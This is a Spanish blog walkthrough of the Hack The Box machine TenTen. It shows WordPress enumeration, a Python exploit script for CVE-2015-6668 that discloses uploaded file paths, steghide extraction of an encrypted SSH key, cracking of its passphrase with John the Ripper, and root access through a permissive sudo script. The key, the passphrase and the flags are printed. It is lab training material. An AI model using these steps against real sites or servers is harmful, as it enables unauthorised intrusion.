---
layout: post
author: S3konDz
title: Máquina TenTen
image: https://www.hackthebox.com/storage/avatars/e58a465e93364c423cd2162945f8f7bf.png
description: Resolución de máquina
---
<img style="display: block;
  margin-left: auto;
  margin-right: auto;
  width: 50%;" src="https://www.hackthebox.com/storage/avatars/e58a465e93364c423cd2162945f8f7bf.png">
  <br>

La máquina que voy a resolver hoy es Tenten, tiene una dificultad media y toca las siguientes técnicas.

* Enumeración en WordPress
* Job-Manager Wordpress Plugin [CVE-2015-6668]
* Steganografía con la herramienta **Steghide**
* Crakeo hash usando la herramienta **John the Ripper**
* Escalada usando listado de privilegios de sudoers


## Reconocimiento

Para empezar lanzamos una traza a la ip para ver si está operativa la máquina. 


```
ping -c 1 10.10.10.10
```
```
--- 10.10.10.10 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 38.111/38.111/38.111/0.000 ms
```
En este caso la máquina está encendida por lo que podemos pasar a la fase de enumeración de puertos.

Hice una utilidad para hacer acelerar este proceso, crea una carpeta con el nombre de la máquina y genera 3 subdirectorios (data, explotation y nmap) En este último directorio tendremos el reporte que genere el reconocimiento con nmap, podéis usarla clonando el siguiente repositorio de github. 

```
git clone https://github.com/S3K0NDZ/machine.git
```

Al ejecutar la herramienta os pedirá el nombre de la máquina, la ip y tipo de escaneo que queréis usar, en este caso vamos a usar el completo. 

```
Introduce el nombre de la máquina: Tenten
Introduce la ip de la máquina: 10.10.10.10
Selecciona tipo de escaneo: 
r) Escaneo rápido
c) Escaneo completo
```

Podemos ver como en el reporte que obtenemos, tenemos abiertos los puertos 22 y 80.

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-21 01:56 CEST
Nmap scan report for 10.10.10.10
Host is up (0.046s latency).
Not shown: 998 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (
Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 (RSA)
|   256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 (ECDSA)
|_  256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-generator: WordPress 4.7.3
|_http-title: Job Portal &#8211; Just another WordPress site
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results
at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.14 seconds
```

## Intrusión

Para la intrusión lo primero que vamos a hacer es entrar en nuestro navegador de preferencia y buscar la página que está alojada en el puerto 80. 

```
http://10.10.10.10
```
Y veremos la siguiente web. 

<img src="http://drive.google.com/uc?export=view&id=1lW4aEO2C0yltPR289OQzqHDpzeT_uB71">

Si lo anazalizamos con whatweb podemos ver como la tecnología que usa es WordPress 

```
http://10.10.10.10 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.10], JQuery[1.12.4], MetaGenerator[WordPress 4.7.3], PoweredBy[WordPress,WordPress,], Script[text/javascript], Title[Job Portal &#8211; Just another WordPress site], UncommonHeaders[link], WordPress[4.7.3]
```
Una vez sabemos esto y vemos que tiene una versión desactualizada, podemos listar usuarios y plugins vulnetables con WPscan, yo en este caso voy a listar usuarios con WPSCAN y voy a enumerar plugins con gobuster fuzzeando, usando un diccionario del repositorio de SECLIST.

```
git clone https://github.com/danielmiessler/SecLists
```
De aquí voy a usar el diccionario de **wp-plugins.fuzz.txt** para listar plugins. 

Usando la herramienta WPscan 

```
wpscan --url http://10.10.10.10 -enumerate u
```
He conseguido un usuario que se llama **Takis**.

Ahora con gobuster aplicaré fuzzing con el diccionario nombrado anteriormente para enumerar plugins.

Me llama la atención el plugin job manager, se usa en la siguiente parte de la página para enviar CV. 

<img src="http://drive.google.com/uc?export=view&id=133ZhxD1VizC2bkHGch9DumQ6sSCH9rTa">

Mirando la página me llama la atención un apartado llamado **Jobs Listing**, una vez entramos dentro vemos que tiene un formulario que nos permite enviar un CV y en la parte inferior no deja subir un fichero, probñe a subir un php malicioso para hacer una reverse shell pero no funcionó, por lo que decidí subir un currículum de prueba que si aceptó, esto servirá para listar contenido más adelante.

<img src="http://drive.google.com/uc?export=view&id=1PYwJMaungE3VY1L9Cui26JI35ABzW6KQ">

<img src="http://drive.google.com/uc?export=view&id=17Qw4U5AxeepD6FiZ8hbwIS5C7HVTYjZ0">

Ahora es momento de fijarse en la url, esto nos servirá para más adelante. 
```
http://10.10.10.10/index.php/jobs/apply/8/
```
Como podemos ver tenemos un "8",si añadimos otros número llegamos al 13, en el que nos aparece lo siguiente... 

<img src="http://drive.google.com/uc?export=view&id=1671D-_HkugOzKyVtsM7kL-c7BsfFORbq">

Nos pone **HackerAccessGranted** en el título, lo que parece ser que nos ha abierto el acceso a algo oculto solo para las manos más experimentadas. 

Vamos a comenzar con lo divertido... buscando una vulnerabilidad para este plugin, me topé con un bypass, en enlace estaba caído por lo que entré en archive.org y mire un snapshot antiguo para poder verlo, os dejo el enlace para que se pueda usar 

https://web.archive.org/web/20160805151229/http://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin

Una vez hemos entendido como funciona el script en python, que en resumidas cuentas lo que hace es iterar por fechas que le indiquemnos diferentes directorios en los que creemos que está un archivo con un nombre que conocemos y nos deja visualizarlo. 

```python
import requests

print ("""  
CVE-2015-6668  
Title: CV filename disclosure on Job-Manager WP Plugin  
Author: Evangelos Mourikis  
Blog: https://vagmour.eu  
Plugin URL: http://www.wp-jobmanager.com  
Versions: <=0.7.25  
""" )
website = input('Enter a vulnerable website: ')  
filename = input('Enter a file name: ')

filename2 = filename.replace(" ", "-")

for year in range(2017,2022):  
    for i in range(1,13):
        for extension in {'doc','pdf','docx','png','jpg','jpeg','gif'}:
            URL = website + "/wp-content/uploads/" + str(year) + "/" + "{:02}".format(i) + "/" + filename2 + "." + extension
            req = requests.get(URL)
            if req.status_code==200:
                print ("[+] URL of CV found! " + URL)
```

El script he tenido que modificarlo para que no de errores, cambiando el formato de los prints, los años por lo que queremos filtrar y los tipos de formato que estamos buscando. 

Una vez lo arrancamos nos pide la url de la web vulnerable y el nombre del archivo, en este caso nosotros vamos a usar de nombre el anteriormente nombrado **HackerAccessGranted**
```
CVE-2015-6668  
Title: CV filename disclosure on Job-Manager WP Plugin  
Author: Evangelos Mourikis  
Blog: https://vagmour.eu  
Plugin URL: http://www.wp-jobmanager.com  
Versions: <=0.7.25  

Enter a vulnerable website: http://10.10.10.10
Enter a file name: HackerAccessGranted
[+] URL of CV found! http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg
```
Y como vemos nos muestra un resultado!! 
```
http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg
```
Si entramos vemos la siguiente imagen. 

<img src="http://drive.google.com/uc?export=view&id=1ikqnYD8Q3wbAcOAib1RvcfOTNuB66AjH">

Vamos a descargarla, y vamos a empezar con la parte divertida...

En primer lugar traté de extraer algún metadato relevante mediante la herramienta **Exiftool** sin éxito, lo mismo aplicando **Strings**, sin éxito, y probé por último una herramienta para esconder información en las fotos ,**Steghide** aquí si conseguí extraer nada más y nada menos que una id_rsa, con el inconveniente que venía cifrado, pero vamos a ver primero como se hace este proceso de extracción de datos...

**PRIMERO - ver la información que contiene la imagen**
```
steghide info HackerAccessGranted.jpg 

"HackerAccessGranted.jpg":
  formato: jpeg
  capacidad: 15,2 KB
�Intenta informarse sobre los datos adjuntos? (s/n) s
Anotar salvoconducto: 
  archivo adjunto "id_rsa":
    tama�o: 1,7 KB
    encriptado: rijndael-128, cbc
    compactado: si
```
Podemos ver que pone archivo adjunto "id_rsa"

**SEGUNDO - extraer la información que contiene la imagen**
```
steghide extract -sf HackerAccessGranted.jpg
```
Y la id_rsa resultante es la siguiente

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,7265FC656C429769E4C1EEFC618E660C

/HXcUBOT3JhzblH7uF9Vh7faa76XHIdr/Ch0pDnJunjdmLS/laq1kulQ3/RF/Vax
tjTzj/V5hBEcL5GcHv3esrODlS0jhML53lAprkpawfbvwbR+XxFIJuz7zLfd/vDo
1KuGrCrRRsipkyae5KiqlC137bmWK9aE/4c5X2yfVTOEeODdW0rAoTzGufWtThZf
K2ny0iTGPndD7LMdm/o5O5As+ChDYFNphV1XDgfDzHgonKMC4iES7Jk8Gz20PJsm
SdWCazF6pIEqhI4NQrnkd8kmKqzkpfWqZDz3+g6f49GYf97aM5TQgTday2oFqoXH
WPhK3Cm0tMGqLZA01+oNuwXS0H53t9FG7GqU31wj7nAGWBpfGodGwedYde4zlOBP
VbNulRMKOkErv/NCiGVRcK6k5Qtdbwforh+6bMjmKE6QvMXbesZtQ0gC9SJZ3lMT
J0IY838HQZgOsSw1jDrxuPV2DUIYFR0W3kQrDVUym0BoxOwOf/MlTxvrC2wvbHqw
AAniuEotb9oaz/Pfau3OO/DVzYkqI99VDX/YBIxd168qqZbXsM9s/aMCdVg7TJ1g
2gxElpV7U9kxil/RNdx5UASFpvFslmOn7CTZ6N44xiatQUHyV1NgpNCyjfEMzXMo
6FtWaVqbGStax1iMRC198Z0cRkX2VoTvTlhQw74rSPGPMEH+OSFksXp7Se/wCDMA
pYZASVxl6oNWQK+pAj5z4WhaBSBEr8ZVmFfykuh4lo7Tsnxa9WNoWXo6X0FSOPMk
tNpBbPPq15+M+dSZaObad9E/MnvBfaSKlvkn4epkB7n0VkO1ssLcecfxi+bWnGPm
KowyqU6iuF28w1J9BtowgnWrUgtlqubmk0wkf+l08ig7koMyT9KfZegR7oF92xE9
4IWDTxfLy75o1DH0Rrm0f77D4HvNC2qQ0dYHkApd1dk4blcb71Fi5WF1B3RruygF
2GSreByXn5g915Ya82uC3O+ST5QBeY2pT8Bk2D6Ikmt6uIlLno0Skr3v9r6JT5J7
L0UtMgdUqf+35+cA70L/wIlP0E04U0aaGpscDg059DL88dzvIhyHg4Tlfd9xWtQS
VxMzURTwEZ43jSxX94PLlwcxzLV6FfRVAKdbi6kACsgVeULiI+yAfPjIIyV0m1kv
5HV/bYJvVatGtmkNuMtuK7NOH8iE7kCDxCnPnPZa0nWoHDk4yd50RlzznkPna74r
Xbo9FdNeLNmER/7GGdQARkpd52Uur08fIJW2wyS1bdgbBgw/G+puFAR8z7ipgj4W
p9LoYqiuxaEbiD5zUzeOtKAKL/nfmzK82zbdPxMrv7TvHUSSWEUC4O9QKiB3amgf
yWMjw3otH+ZLnBmy/fS6IVQ5OnV6rVhQ7+LRKe+qlYidzfp19lIL8UidbsBfWAzB
9Xk0sH5c1NQT6spo/nQM3UNIkkn+a7zKPJmetHsO4Ob3xKLiSpw5f35SRV+rF+mO
vIUE1/YssXMO7TK6iBIXCuuOUtOpGiLxNVRIaJvbGmazLWCSyptk5fJhPLkhuK+J
YoZn9FNAuRiYFL3rw+6qol+KoqzoPJJek6WHRy8OSE+8Dz1ysTLIPB6tGKn7EWnP
-----END RSA PRIVATE KEY-----
```
Está cifrada, para descifrarla y poder usarla tenemos que hashearla con ssh2john, un script en python que podéis clonaros de aquí 

```
git clone https://github.com/openwall/john.git
```
Arrancamos el script
```
python ssh2john.py id_rsa > idrsa.hash
```
Y ya obtenemos el hash, solo falta sacar su contraseña, para esto usaremos john para fuzzear la contraseña através del famoso diccionario rockyou.txt, podemos usar cualquier diccionario yo uso este porque me resulta más cómodo. 
```
john --wordlist=/usr/share/wordlists/rockyou.txt idrsa.hash 


Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 16 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
superpassword    (id_rsa)
1g 0:00:00:02 DONE (2022-06-23 03:05) 0.4149g/s 5950Kp/s 5950Kc/s 5950KC/s  0 0 0..*7¡Vamos!
Session completed
```
Podemos ver que la contraseña que encuentra es **superpassword** así que solo queda la parte de conectarse a la máquina y obtener las flags.

## Escalada de privilegios 

Una vez con toda la información en nuestro poder, el usuario Takis y la id_rsa con su contraseña, podemos entrar en la máquina por ssh, ya que tenemos el puerto 22 abierto, de la siguiente manera.
```
ssh -i id_rsa takis@10.10.10.10


Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

65 packages can be updated.
39 updates are security updates.


Last login: Fri May  5 23:05:36 2017

takis@tenten:~$ 
```

Y ya estamos dentro de la máquina, con el usuario **takis** 

**FLAG USER** 
```
takis@tenten:~$ cat user.txt 
c8afc246f56dcedd58f7ed5c0a24ba6b
```
La escalada es muy poco realista, pero se realiza de la siguiente manera...

Si listamos que puede hacer sudo, con un "sudo -l" veremos lo siguiente

```
takis@tenten:~$ sudo -l

Matching Defaults entries for takis on tenten:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User takis may run the following commands on tenten:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/fuckin
```
Tenemos un script que se llama **fuckin**, que es el siguiente

```
#!/bin/bash
$1 $2 $3 $4
```
Esto nos permite ejecutar cualquier comando como sudo ejecutando este script, ya que lo almacena en sus variables, voy a ejecutar sudo ./fuckin bash y así obtengo ya el root.

```
sudo ./fuckin bash

root@tenten:/bin# 
```

**FLAG ROOT** 
```
root@tenten:/root# cat root.txt 
913296a18a362fd8c2c214918df6e572
```

**Maquina resuelta!!** 